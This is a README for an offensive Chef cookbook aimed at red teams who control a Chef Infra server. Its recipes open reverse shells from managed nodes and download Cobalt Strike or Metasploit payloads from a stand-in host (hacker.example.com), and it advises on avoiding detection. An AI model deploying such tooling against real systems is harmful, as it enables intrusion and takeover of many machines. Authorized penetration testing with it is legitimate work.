[![Ko-fi](https://www.ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/h4ckninja)

# Line Cook

This is Line Cook. It's a sister project to Prep Station. Both tools are for pentesters and Red Teams to target Chef Infra server installations.

# About

This cookbook is geared towards pentesters and Red Teams who have access to a [Chef Infra server](https://www.chef.io/products/chef-infra/) during an engagement and want to gain control over the nodes in it.

I've been playing around with this idea for a while, but shoutout to [Ryan Wendel](https://www.ryanwendel.com/2017/10/03/cooking-up-shells-with-a-compromised-chef-server/) for doing this first. It's good to see Chef and similar products get some attention because they can be a veritable gold mine in engagements.

I came across this blog post while looking to see if anybody has done this before, rather than reinventing the wheel. While he did, it was a one-off, and I didn't see anybody who had something more distributable. If I'm wrong, feel free to link me to resources. 

I've also got a [blog post](https://h4ck.ninja/2020/02/27/im-in-your-chef-server/) about stealing data from Chef.


# Goals

This cookbook is intended to be a lightweight tool to introduce your CnC tools, like Metasploit and CobaltStrike. It doesn't replace good OpSec practices. That said, if you have ideas or suggestions, please submit tickets.

I want this cookbook to be "living off the land". I don't want to download new gems or install packages on to pwned servers. Even pushing Metasploit and CobaltStrike is questionable as enterprises are moving to EDR products, which can get you caught real fast.


# Help

This is my contribution to the community. I think Chef Infra is a wonderful product, when configured and used properly ... However, I have a full-time job and I [stream on Twitch](https://twitch.tv/h4ckninja) so my time is limited when looking at tickets. Please feel free to submit PRs and suggestions. If you feel up to it, I also welcome [tips](https://ko-fi.com/h4ckninja). It'll also tell me that I need to spend more time on this project.

That all said, enjoy!

# Recipes

## Reflection

This recipe is a simplistic reverse connection. It handles Windows and *nix hosts, with basic error handling for invalid commands.

*Note:* This will block the `chef-client` from completing the run until you disconnect. You should be aware of possible timeouts and logging on the Chef server that monitors recipes taking an excessive amount of time.

There's a few options that can be controlled:

`attributes/reflection.rb`

| Option | Default Value | Explanation |
| ------ | ------------- | ----------- |
| default['line_cook']['reflection']['host'] | 127.0.0.1 | The host to send the reverse shell back to. |
|  default['line_cook']['reflection']['port'] | 4444 | The port your system is listening on to receive connections |

## Agent

This recipe handles downloading of external resources, such as Cobalt Strike beacons or Metasploit payloads to the node.

Unlike the reflection recipe, this action attempts to be non-blocking, allowing the recipe to exit quickly to avoid detection through timeouts or excessive run times.


`attributes/agent.rb`

| Option | Default Value | Explanation |
| ------ | ------------- | ----------- |
| default['line_cook']['agent']['windows']['download'] | http://hacker.example.com/metasploit.exe | The download URL for your agent. This agent can be CobaltStrike, Metasploit, or something custom. It must be a Windows PE file. |
| default['line_cook']['agent']['windows']['save_path'] | C:\metasploit.exe | The save path to the file system. |
| default['line_cook']['agent']['linux']['download']  | http://hacker.example.com/metasploit | The download URL to the executable for *nix systems. This must be an ELF file. |
| default['line_cook']['agent']['linux']['save_path'] | /tmp/metasploit | The save path on *nix systems. |

## Cleanup

This recipe is a very simple cleanup of your downloaded agents. You can set it to the runlist after you are finished.


# Runlists

This can be as concurrent as your CnC can handle. Keep track of the nodes you set to the run list so you can unset them to avoid reconnections to your CnC.
